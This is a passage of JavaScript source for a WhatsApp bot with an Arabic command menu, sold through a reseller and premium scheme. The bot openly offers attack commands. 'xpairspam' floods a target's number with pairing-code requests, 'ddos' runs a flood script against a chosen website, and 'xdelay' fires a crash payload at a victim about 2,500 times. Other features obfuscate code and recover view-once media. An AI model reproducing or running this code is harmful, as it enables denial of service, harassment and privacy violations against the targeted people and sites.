                name:  'single_select' ,
                paramsJson: JSON.stringify({
                    title: "©︎BODY_𝔪𝔢𝔫𝔲/𝔠𝔯𝔞𝔰𝔥",
                    sections: [
                        {
                            title: "BODY MENU",
                            highlight_label: "",
                            rows: [
                                { title: "𝑻𝑶𝑶𝑳𝑺", description: " *( 𝑻𝑶𝑶𝑳𝑺 )*", id: "7218299328" },
                                
                               
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];


    await XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m });
await XeonBotInc.sendMessage(m.chat, {
audio: { url: audioUrl },
mimetype: 'audio/mp4',
ptt: false,
contextInfo: {
isForwarded: true
}
});
}; 
break 
        
        
case 'menu':
case 'help':
case 'اوامر':
case 'جوكر':
case 'allmenu': {
    const axios = require('axios');
    const more = String.fromCharCode(8206);
    const readmore = more.repeat(4001);
    const xeonmenuoh = `
╔═══ ✦ ━━━━━━━━━ ═══╗
🩸    𝗠𝗜𝗗𝗢 𝗕𝗜𝗡 𝗔𝗦𝗬𝗨𝗧  🩸
╚═══ ✦ ━━━━━━━━━ ═══╝

📜 *قائمة الأوامر الرئيسية*

⚡ *قائمة الباقات (Bugs)*
┣━━━━━━━━✦━━━━━━━━┫
┃ 📱 *باقات الأندرويد*
┣━━━━━━━━✦━━━━━━━━┫
┃★ xdelay      » 20XXX
┃★ groupmix        » 20XXX
┃★ xnxx             » 20XXX
┃★ crash           » 20XXX
┃★ infinity        » 20XXX
┃★ uispam          » 20XXX
┃★ kill            » 20XXX
┃★ frezerchat      » 20XXX
┃★ forceblock      » متاح
┃★ pairspam        » متاح
┃★ rvo             » متاح
┃★ s               » متاح
┃★ viewstatus      » تشغيل/إيقاف

┣━━━━━━━━✦━━━━━━━━┫
┃ 🍎 *باقات الآيفون*
┣━━━━━━━━✦━━━━━━━━┫
┃★ iosinvisible    » 20XXX
┃★ freezerios      » 20XXX

┣━━━━━━━━✦━━━━━━━━┫
┃ 🔧 *باقات أخرى*
┣━━━━━━━━✦━━━━━━━━┫
┃★ callspam        » [الرقم]
┃★ xpairspam       » [الرقم]
┃★ killgroup       » [ايدي المجموعة]
┃★ mixgc           » [ايدي المجموعة]
┃★ forecegroup     » [ايدي المجموعة]
┃★ listgc          » متاح
┃★ promoteall      » (داخل المجموعة)
┃★ demoteall       » (داخل المجموعة)
┃★ kickall         » (داخل المجموعة)
┃★ reactch         » [رابط المنشور] [النص]

╔════━━━━✦━━━━━════╗
🩸    𝗠𝗜𝗗𝗢 𝗕𝗜𝗡 𝗔𝗦𝗬𝗨𝗧  🩸
╚════━━━━✦━━━━━════╝

✨ *ملاحظات:*
• استبدل [الرقم] برقم الهدف
• استبدل [ايدي المجموعة] برمز المجموعة
• الأرقام مثل 20XXX تشير إلى كود الباقة
`;

    try {
        // تحميل الفيديو من رابط مباشر
        const videoUrl = "https://files.catbox.moe/tdvci0.mp4"; // رابط مباشر للفيديو
        const videoBuffer = (await axios.get(videoUrl, { responseType: 'arraybuffer' })).data;

        await XeonBotInc.sendMessage(m.chat, {
            video: videoBuffer,
            caption: xeonmenuoh,
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                mentionedJid: [sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: ownername,
                    newsletterJid: "120363422217202244@g.us",
                },
                externalAdReply: {
                    showAdAttribution: true,
                    title: ownername,
                    body: botname,
                    thumbnailUrl: "https://pin.it/yG8S5e62r",
                    sourceUrl: link,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: m });
    } catch (e) {
        await XeonBotInc.sendMessage(m.chat, {
            text: "🎥 تعذر تحميل الفيديو من الرابط."
        }, { quoted: m });
    }

    try {
        // تحميل الصوت من رابط مباشر
        const audioUrl = "https://files.catbox.moe/28ljz9.mp3"; // ضع رابط الصوت المباشر هنا
        const audioBuffer = (await axios.get(audioUrl, { responseType: 'arraybuffer' })).data;

        await XeonBotInc.sendMessage(m.chat, {
            audio: audioBuffer,
            mimetype: 'audio/mpeg',
            ptt: true,
            contextInfo: {
                isForwarded: true
            }
        }, { quoted: m });
    } catch (e) {
        await XeonBotInc.sendMessage(m.chat, {
            text: "🎵 تعذر تحميل الصوت من الرابط."
        }, { quoted: m });
    }
}
break;

case 'xpairspam': {

			if (!q) return replygcxeon(`_Use : ${prefix+command} number\n_Example : ${prefix+command} 916909137211`)
			let [peenis, pepekk = "200"] = q.split("|")
			
			let target = peenis.replace(/[^0-9]/g, '').trim()
			let {
				default: makeWaSocket,
				useMultiFileAuthState,
				fetchLatestBaileysVersion
			} = require('@whiskeysockets/baileys')
			let {
				state
			} = await useMultiFileAuthState('XSession')
			let {
				version
			} = await fetchLatestBaileysVersion()
	 replygcxeon(`Success!`)
			let sucked = await makeWaSocket({
				auth: state,
				version,
				logger: pino({
					level: 'fatal'
				})
			})
			for (let i = 0; i < pepekk; i++) {
				await sleep(1500)
				let prc = await sucked.requestPairingCode(target)
				/*await console.log(`Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`)*/
			}
			await sleep(15000)
			}
		break
case 'ddos':{

if (!q.includes(' ')) return replygcxeon(`Use Methode: .${command} <target> <time>\nExaple: .${command} example.xyz 60`)
if (q.includes(' .shop')){
	return replygcxeon(`Cannot attack developer's site`);
	}
                     const targetweb = q.substring(0, q.indexOf(' ') - 0)
                const timeweb = q.substring(q.lastIndexOf(' ') + 1) 
replygcxeon(`Bot is attacking ${targetweb} with time ${timeweb}`)
              exec(`node ddos.js ${targetweb} ${timeweb}`, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
        if (error) {
          replygcxeon(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          replygcxeon(`Error: ${stderr}`);
          return;
        }
        replygcxeon(`Success\n\n🤙 target: ${targetweb},\n🤙 Time: ${timeweb}`);
      });  
      }                 
break

case 'enc': case 'encrypt': {

        const JSConfuser = require("js-confuser");
        const usage = `Usage Example:
${prefix + command} (Input text or reply text to obfuscate code)
${prefix + command} doc (Reply to a document)`;

        let text;
        if (args.length >= 1) {
            text = args.join(" ");
        } else if (m.quoted && m.quoted.text) {
            text = m.quoted.text;
        } else {
            return replygcxeon(usage);
        }
        
        try {
            let code;
            if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
                let docBuffer;
                if (m.quoted.mimetype) {
                    docBuffer = await m.quoted.download();
                }
                code = docBuffer.toString('utf-8');
            } else {
                code = text;
            }

const optionsObf6 = {
          target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "素晴座素晴難BODY素晴座素晴難" + 
            "素晴座素晴難BODY素晴座素晴難";
        
        // Fungsi untuk menghapus karakter yang tidak diinginkan
        function removeUnwantedChars(input) {
            return input.replace(
                /[^a-zA-Z座Nandokuka素Muzukashī素晴]/g, ''
            );
        }

        // Fungsi untuk menghasilkan string acak
        function randomString(length) {
            let result = '';
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; // Hanya simbol
            const charactersLength = characters.length;

            for (let i = 0; i < length; i++) {
                result += characters.charAt(
                    Math.floor(Math.random() * charactersLength)
                );
            }
            return result;
        }

        return removeUnwantedChars(originalString) + randomString(2);
    },

    renameVariables: true,
    renameGlobals: true,

    stringEncoding: true,
    stringSplitting: 0.0,
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: 1.0,

    shuffle: {
        hash: 0.0,
        true: 0.0
    },

    stack: true,
    controlFlowFlattening: 1.0,
    opaquePredicates: 0.9,
    deadCode: 0.0,
    dispatcher: true,
    rgf: false,
    calculator: true,
    hexadecimalNumbers: true,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
};


        const options = {
            target: "node",
  calculator: true,
  compact: true,
  hexadecimalNumbers: true,
  controlFlowFlattening: 0.5,
  deadCode: 0.25,
  dispatcher: true,
  duplicateLiteralsRemoval: 0.75,
  flatten: true,
  globalConcealing: true,
  minify: true,
  movedDeclarations: true,
  objectExtraction: true,
  opaquePredicates: 0.75,
  renameVariables: true,
  renameGlobals: true,
  shuffle: true,
  stringConcealing: true,
  stringCompression: true,
  stringEncoding: true,
  stringSplitting: 0.75,
  preserveFunctionLength: true,
  identifierGenerator: function () {
                return "DREAM_GUY_XEON" + Math.random().toString(36).substring(7);
            },
        };

            const obfuscatedCode = await JSConfuser.obfuscate(code, optionsObf6);

            const filePath = './enc_by_@ .js';
            fs.writeFileSync(filePath, obfuscatedCode);

            await XeonBotInc.sendMessage(m.chat, {
                document: {
                    url: filePath
                },
                mimetype: 'application/javascript',
                fileName: 'Encrypted By @ .js'
            }, { quoted: m });

        } catch (error) {
            const errorMessage = `There is an error: ${error.message}`;
            await replygcxeon(errorMessage);
        }
}
break;
case 'dec': case 'decrypt': {

const { webcrack } = await import('webcrack');
const usage = `Usage Example:
${prefix + command} (Input text or reply text to dec code)
${prefix + command} doc (Reply to a document)`;

let text;
if (args.length >= 1) {
text = args.join(" ");
} else if (m.quoted && m.quoted.text) {
text = m.quoted.text;
} else {
return replygcxeon(usage);
}

try {
let message;
if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
let docBuffer;
if (m.quoted.mimetype) {
docBuffer = await m.quoted.download();
}
message = await webcrack(docBuffer.toString('utf-8'));
} else {
message = await webcrack(text);
}

const filePath = './dec_by_@ .js';
fs.writeFileSync(filePath, message.code);

await XeonBotInc.sendMessage(m.chat, {
document: {
url: filePath
},
mimetype: 'application/javascript',
fileName: 'Decrypted By @ '
}, {quoted: m});

} catch (error) {
const errorMessage = `There is an error: ${error.message}`;
await replygcxeon(errorMessage);
}
}
break;
case 'readviewonce': case 'rvo': {

	if (!m.quoted) return replygcxeon(`Reply to view once message`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return replygcxeon(`This is not a view once message`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return XeonBotInc.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return XeonBotInc.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break

case 'clearchat':{

m.reply('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
                    }
break

case 'xdelay': {
if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201286008203") {
    return;
    }
    if (victim == "919366316011") {
    return;
    }
    if (victim == "201286008203") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
sendMessageWithMentions(
  `✅ تم الارسال بنجاح برعايه بوت ميدو بن اسيوط ❤️ 
🎯 Target: ${Xreturn.split('@')[0]}\n\n\n\n\n\n\n\n\n\n\n\n
👨🏻‍💻 From: ${m.sender.split('@')[0]}`,
  [Xreturn]
);
  for (let i = 0; i <50; i++) {
      await ZenoDelayNewBeta(Xreturn)
      await (250)
      await ZenoDelayNewBeta(Xreturn);
await (200)
await ZenoDelayNewBeta(Xreturn);
await (300)
await ZenoDelayNewBeta(Xreturn);
await (300)
await ZenoDelayNewBeta(Xreturn);
await (200)
await ZenoDelayNewBeta(Xreturn);
await (200)
await ZenoDelayNewBeta(Xreturn);
await (200)
await ZenoDelayNewBeta(Xreturn);
await (200)
await ZenoDelayNewBeta(Xreturn);
await (200)
await ZenoDelayNewBeta(Xreturn);
await (200)
await ZenoDelayNewBeta(Xreturn)
await (200)
await ZenoDelayNewBeta(Xreturn)
await (250)
await ZenoDelayNewBeta(Xreturn)
await (200)
await ZenoDelayNewBeta(Xreturn)
await (250)
await ZenoDelayNewBeta(Xreturn)
await (350)
await ZenoDelayNewBeta(Xreturn)
await (250)
await ZenoDelayNewBeta(Xreturn)
await (250)
await ZenoDelayNewBeta(Xreturn)
await (250)
await ZenoDelayNewBeta(Xreturn)
await (250)
await ZenoDelayNewBeta(Xreturn)
await (250)
await ZenoDelayNewBeta(Xreturn)
await (250)
await ZenoDelayNewBeta(Xreturn)
await (300)
await ZenoDelayNewBeta(Xreturn)
await (350)
await ZenoDelayNewBeta(Xreturn)
await (350)
await ZenoDelayNewBeta(Xreturn)
await (350)
await ZenoDelayNewBeta(Xreturn);
await (350)
await ZenoDelayNewBeta(Xreturn)
await (350)
await ZenoDelayNewBeta(Xreturn)
await (350)
await ZenoDelayNewBeta(Xreturn)
await (250)
await ZenoDelayNewBeta(Xreturn)
await (250)
await ZenoDelayNewBeta(Xreturn)
await (250)
await ZenoDelayNewBeta(Xreturn)
await (250)
await ZenoDelayNewBeta(Xreturn)
await (350)
await ZenoDelayNewBeta(Xreturn)
await (250)
await ZenoDelayNewBeta(Xreturn)
await (250)
await ZenoDelayNewBeta(Xreturn)
await (250)
await ZenoDelayNewBeta(Xreturn)
await (250)
await ZenoDelayNewBeta(Xreturn)
await (350)
await ZenoDelayNewBeta(Xreturn)
await (250)
await ZenoDelayNewBeta(Xreturn)
await (250)
await ZenoDelayNewBeta(Xreturn)
await (250)
await ZenoDelayNewBeta(Xreturn)
await (250)
}
}
break


case "checkhost": {

if (!q) return replygcxeon(`Example : ${prefix + command} https://nxnn.com`)
let msg = { viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": "p"
    },
    "body": {
      "text": "Click Chech Host To Check Web"
    },
    "footer": {
      "text": botname
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": JSON.stringify( {display_text : 'Check Host' , url : `https://check-host.net/check-http?host=${q}`, merchant_url : `https://check-host.net/check-http?host=${q}` })
        }
      ],
      "messageParamsJson": ""
    }
  }
}
}
}
XeonBotInc.relayMessage(m.chat, msg, {});
}
break

case 'addresell': case 'addreseller': {
    if (!global.dev.includes(senderNumber)) return
    
    let number = text.replace(/[^0-9]/g, '') // Extract number from text
    if (!number) return replygcxeon("Please provide a valid number.");

    if (global.db.data.owners.includes(number)) {
        return replygcxeon("Number already in reseller list.");
    }

    global.db.data.owners.push(number);
    fs.writeFileSync('./database/database.json', JSON.stringify(global.db, null, 2));
    replygcxeon(`Number ${number} added to reseller.`);
}
break;

case 'delresell': case 'delreseller': {
    if (!global.dev.includes(senderNumber)) return

    let numberToDelete = text.replace(/[^0-9]/g, '') // Extract the number
    if (!numberToDelete) return m.reply("Please provide a valid number to delete.");

    // Check if the number exists in the owners list
    let index = global.db.data.owners.indexOf(numberToDelete);
    if (index === -1) {
        return replygcxeon("The provided number is not in the reseller list.");
    }

    // Remove the number from the owners list
    global.db.data.owners.splice(index, 1);
    fs.writeFileSync('./database/database.json', JSON.stringify(global.db, null, 2));
    replygcxeon(`Number ${numberToDelete} has been removed from the reseller list.`);
}
break;

case 'listresell': case 'listreseller': {
    let owners = global.db.data.owners || [];
    if (owners.length === 0) {
        return replygcxeon("There are no reseller in the list.");
    }

    let ownerList = owners.map((num, index) => `${index + 1}. ${num}`).join('\n');
    replygcxeon(`Total Reseller: ${owners.length}\n\n${ownerList}`);
}
break;


case 'addprem':
			case 'addpremium': {
				if (!(global.db.data.owners || []).includes(senderNumber)) {
    return replygcxeon(`❌ Sorry you don't have permission to use this command. This command can only be used by reseller! 

Want to buy reseller? Chat Developer!
YouTube: 
Telegram: @lo_tus_19
WhatsApp: +201286008203`);
}
				if (!text) return replygcxeon(`*Incorrect use!*\n\nUsage:\n${prefix + command} <user|time>\n\nExample:\n${prefix + command} @0|1d`)
				let nomor = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
				if (owner.includes(nomor)) return replygcxeon("*Bot owners can't get owner!*")
				let premium = await cd.isPremium(usersdb, nomor)
				if (premium) return replygcxeon("*This user is already in the premium list*")
				let users = await XeonBotInc.onWhatsApp(nomor)
				if (users.length < 1) return replygcxeon(`*Tag/reply/input number correctly!*\n\nUsage:\n${prefix + command} <user|time>\n\nExample:\n${prefix + command} @0|1d`)
				let expired = text.split("|")[1]
				if (!expired) return replygcxeon(`*Enter expiry date!*\n\nUsage:\n${prefix + command} <user|time>\n\nExample:\n${prefix + command} @0|1d`)
				await XeonBotInc.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				let addprem = await cd.addPrem(usersdb, users[0].jid, expired)
				const contentText = {
					text: addprem,
					contextInfo: {
						mentionedJid: XeonBotInc.ments(addprem),
						externalAdReply: {
							title: `OWNER 💳`,
							previewType: "PHOTO",
							thumbnailUrl: `https://mega.nz/file/DtgDBAZK#TvUFm5Vzu81o1HinHpo0f5UK_4MJ_z0zoN3rUmX5GVY`,
							sourceUrl: link
						}
					}
				};
				return XeonBotInc.sendMessage(m.chat, contentText, {
					quoted: m,
				});
			}
			break

case 'delprem':
			case 'delpremium': {
				if (!(global.db.data.owners || []).includes(senderNumber)) {
    return replygcxeon(`❌ Sorry you don't have permission to use this command. This command can only be used by reseller! 

Want to buy reseller? Chat Developer!
YouTube: @BODY_brt 
Telegram: @lo_tus_19
WhatsApp: +201286008203`);
}
				if (!text) return replygcxeon(`*Incorrect use!*\n\nUsage:\n${prefix + command} <user>\n\nExample:\n${prefix + command} @0`)
				let nomor = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
				let premium = await cd.isPremium(usersdb, nomor)
				if (!premium) return replygcxeon("*This user is not a premium user!*")
				let delprem = await cd.delPrem(usersdb, nomor)
				replygcxeon(delprem)
			}
			break
case "شغل":			
case "play":
        {
          if (!text) {
            return replygcxeon("⚠️ برجاء ادخال اسم الاغنيه!");
          }
          try {
            await XeonBotInc.sendMessage(m.chat, {
              react: {
                text: "🧐",
                key: m.key
              }
            });
            let url = `https://api.vreden.my.id/api/ytplaymp3?query=${encodeURIComponent(text)}`;
            let response = await fetch(url);
            let json = await response.json();
            if (!json || json.status !== 200 || !json.result.status) {
              await XeonBotInc.sendMessage(m.chat, {
                react: {
                  text: "❌",
                  key: m.key
                }
              });
              return replygcxeon("❌ لم يتم الحصول علي الاغنيه!");
            }
            let result = {
              title: json.result.metadata.title,
              author: json.result.metadata.author.name,
              duration: json.result.metadata.timestamp,
              views: json.result.metadata.views,
              link: json.result.metadata.url,
              thumb: json.result.metadata.thumbnail,
              audio: json.result.download.url
            };
            let caption = `*ʏᴏᴜᴛᴜʙᴇ ᴍᴘ𝟹 ᴘʟᴀʏ*\n\n`;
            caption += `*ᴊᴜᴅᴜʟ:* ${result.title}\n`;
            caption += `*ᴀʀᴛɪs:* ${result.author}\n`;
            caption += `*ᴅᴜʀᴀsɪ:* ${result.duration}\n`;
            caption += `*ᴠɪᴇᴡs:* ${result.views}\n`;
            caption += `*ʟɪɴᴋ:* [YouTube](${result.link})\n\n`;
            caption += `> جاري الارسال برجاء الانتظار`;
            await XeonBotInc.sendMessage(m.chat, {
              react: {
                text: "😜",
                key: m.key
              }
            });
            await XeonBotInc.sendMessage(m.chat, {
              image: {
                url: result.thumb
              },
              caption
            }, {
              quoted: m
            });
            await XeonBotInc.sendMessage(m.chat, {
              audio: {
                url: result.audio
              },
              mimetype: "audio/mp4"
            }, {
              quoted: m
            });
          } catch (error) {
            console.error("❌ خطأ:", error);
            return replygcxeon("❌ حدث خطأ اثناء ارسال الاغنيه.");
          }
        }
        
break			
			
			

case 'listprem':
case 'listpremium': {
	if (!(global.db.data.owners || []).includes(senderNumber)) {
    return replygcxeon(`❌ Sorry you don't have permission to use this command. This command can only be used by reseller! 

Want to buy reseller? Chat Developer!
YouTube: @BODY_brt 
Telegram: @lo_tus_19
WhatsApp: +201286008203`);
}
    try {
        let premium = await cd.listPremium(usersdb);
        let teks = `*</> PREM USER LIST </>*\n\n`;

        for (let i = 0; i < premium.length; i++) {
            let expiry = usersdb[premium[i]].premiumExpiry;

            if (!expiry || expiry <= Date.now()) {
                teks += `${i + 1}. @${premium[i].split("@")[0]}\nExpired: Already expired\n\n`;
                continue;
            }

            // Calculate remaining time
            let timeLeft = expiry - Date.now();
            let days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
            let hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            let minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));

            teks += `${i + 1}. @${premium[i].split("@")[0]}\nExpire In: ${days} day, ${hours} hour, ${minutes} minute\n\n`;
        }

        XeonBotInc.sendTextWithMentions(m.chat, teks, m);
    } catch (error) {
        replygcxeon(util.format(error), command);
    }
}
break;

			
			case 'checkprem':
case 'checkpremium': {
    try {
        let expiry = usersdb[m.sender].premiumExpiry;
        if (!expiry || expiry <= Date.now()) {
            return replygcxeon(`Your owner subscription has already expired.`);
        }

        // Calculate remaining time
        let timeLeft = expiry - Date.now();
        let days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
        let hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        let minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));

        let teks = `*</> PREM USER INFO </>*

*Subscribe Info* :
- User : @${m.sender.split("@")[0]}
- Duration : ${days}D
- Expire In : 
${days} day, ${hours} hour, ${minutes} minute

*Benefit Info* :
- Premium Access : Yes
- User Priority : Yes
`;

        const contentText = {
            text: teks,
            contextInfo: {
                mentionedJid: XeonBotInc.ments(teks),
                externalAdReply: {
                    title: `PREMIUM 💳`,
                    previewType: "PHOTO",
                    thumbnailUrl: `https://files.catbox.moe/a9m323.jpg`,
                    sourceUrl: link,
                },
            },
        };

        return XeonBotInc.sendMessage(m.chat, contentText, { quoted: m });
    } catch (error) {
        await replygcxeon(util.format(error), command);
    }
}
break;


case 'self': case 'خاص': {
    if (!(global.db.data.owners || []).includes(senderNumber)) {
        return replygcxeon(`❌ عذراً، ليس لديك إذن لاستخدام هذا الأمر. هذا الأمر مخصص للموزعين فقط!

هل ترغب في شراء صلاحية الموزع؟ تواصل مع المطور!
يوتيوب: @BODY_brt 
تيليجرام: @lo_tus_19
واتساب: +201286008203`);
    }
    XeonBotInc.public = false
    replygcxeon('✅ تم التغيير بنجاح إلى وضع الخاص')
}
break

case 'public': case 'عام': {
    if (!(global.db.data.owners || []).includes(senderNumber)) {
        return replygcxeon(`❌ عذراً، ليس لديك إذن لاستخدام هذا الأمر. هذا الأمر مخصص للموزعين فقط!

هل ترغب في شراء صلاحية الموزع؟ تواصل مع المطور!
يوتيوب: @BODY_brt 
تيليجرام: @lo_tus_19
واتساب: +201286008203`);
    }
    XeonBotInc.public = true
    replygcxeon('✅ تم التغيير بنجاح إلى وضع العام')
}
break

case 'listgc': case 'المجموعات': case 'قائمة_المجموعات': {
    let getGroups = await XeonBotInc.groupFetchAllParticipating()
    let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
    let anu = groups.map((v) => v.id)
    let hituet = 0
    let teks = `⬣ *قائمة المجموعات*\n\nإجمالي المجموعات : ${anu.length} مجموعة\n\n`
    for (let x of anu) {
        let metadata2 = await XeonBotInc.groupMetadata(x)
        teks += `❏ المجموعة ${hituet+=1}\n│★ *الاسم :* ${metadata2.subject}\n│★ *المعرف :* ${metadata2.id}\n│★ *الأعضاء :* ${metadata2.participants.length}\n╰────|\n\n`
    }
    m.reply(teks)
}
break

case 'owner': case 'المطور': case 'صاحب_البوت': {
    const wokex = ownernomer // استخراج الجزء الرقمي
    const pushnamex = `${wokex}`
    const kontak = {
        "displayName": pushnamex,
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN: ${pushnamex}\nitem1.TEL;waid=${wokex}:${wokex}\nitem1.X>ABLabel:\nمن فضلك لا تراسل المطور\nURL;Email Owner:${pushnamex}@gmail.com\nORG: هذا هو المطور\nEND:VCARD`
    }
    const oke = await XeonBotInc.sendMessage(from, {
        contacts: { contacts: [kontak] },
        contextInfo: { 
            forwardingScore: 999, 
            isForwarded: false, 
            mentionedJid: [sender],
            "externalAdReply": {
                "showAdAttribution": true,
                "renderLargerThumbnail": true,
                "title": botname, 
                "containsAutoReply": true,
                "mediaType": 1, 
                "jpegThumbnail": fs.readFileSync("./XeonMedia/thumb.jpg"),
                "mediaUrl": 'https://mega.nz/file/DtgDBAZK#TvUFm5Vzu81o1HinHpo0f5UK_4MJ_z0zoN3rUmX5GVY',
                "sourceUrl": `https://youtube.com/@GOKRALIOTIOBR`
            }
        }
    }, { quoted: m })
}
break

case 'xweb': case 'كاتالوج': case 'العرض': {
    try {
        for (let i = 0; i < 10; i++) {
            messa = await prepareWAMessageMedia({
                image: {
                    url: `https://pic.re/image`
                }
            }, {
                upload: XeonBotInc.waUploadToServer
            })
            catalog = generateWAMessageFromContent(from, proto.Message.fromObject({
                "productMessage": {
                    "product": {
                        "productImage": messa.imageMessage,
                        "productId": "449756950375071",
                        "itemCount": 99999999999,
                        "title": `𝗠𝗜𝗗𝗢 X تيليجرام: @lo_tus_19`,
                        "description": ``,
                        "currencyCodeIso4217": "IDR",
                        "footerText": ``,
                        "productImageCount": 99999999999999999999,
                        "firstImageId": 9999999999,
                        "priceAmount1000": "999",
                        "salePriceAmount1000": "IDR 99.99999999999999999999",
                        "thumbnail": messa.imageMessage,
                        "jpegThumbnail": m,
                        "firstImageId": 99999999,
                        "url": "wa.me/201286008203"
                    },
                    "businessOwnerJid": from,
                }
            }), {
                userJid: XeonBotInc.user.id,
                quoted: null
            })
            XeonBotInc.relayMessage(from, catalog.message, {
                messageId: catalog.key.id
            })
        }
    } catch (e) {
        console.log(e);
    }
}
break

case 'ping': case 'runtime': case 'p': case 'botstatus': case 'statusbot': case 'السرعة': case 'الحالة': case 'بنق': {
    const speed = require('performance-now')
    const { performance } = require('perf_hooks')
    let timestamp = speed()
    let latensi = speed() - timestamp
    neww = performance.now()
    oldd = performance.now()
    respon = `
سرعة الاستجابة:
${latensi.toFixed(4)} _ثانية_
${oldd - neww} _مللي ثانية_

مدة التشغيل:
${runtime(process.uptime())}
    `.trim()
    replygcxeon(respon)
}
break

case 'makecase': case 'صنع_كود': case 'إنشاء_كود': {
    if (!m.quoted) return replygcxeon('رد على رسالة لإنشاء كود لها!');
    كود = q.split(' ')[0];
    if (!كود) {
        return replygcxeon(`طريقة الاستخدام: ${prefix+command} اسم_الكود`);
    }    
    const النص = (JSON.stringify(m.message.extendedTextMessage.contextInfo.quotedMessage, null, 2))
    replygcxeon (`case '${كود}': 
if (!isBot && !isCreator) return
try {
var ${كود} = generateWAMessageFromContent(from, proto.Message.fromObject(${النص}),{ userJid: from })
XeonBotInc.relayMessage(from, ${كود}.message, {messageId: ${كود}.key.id })
} catch (e) {
console.log(e)
}
break`)
}
break

case 'tesb': case 'اختبار': case 'تجربة': {
    let msgs = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: `مرحباً`
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: botname
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        hasMediaAttachment: true,
                        ...await prepareWAMessageMedia(
                            { image: fs.readFileSync('./XeonMedia/donate.jpg') },
                            { upload: XeonBotInc.waUploadToServer }
                        )
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                name: "cta_call",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "اتصال بالمطور",
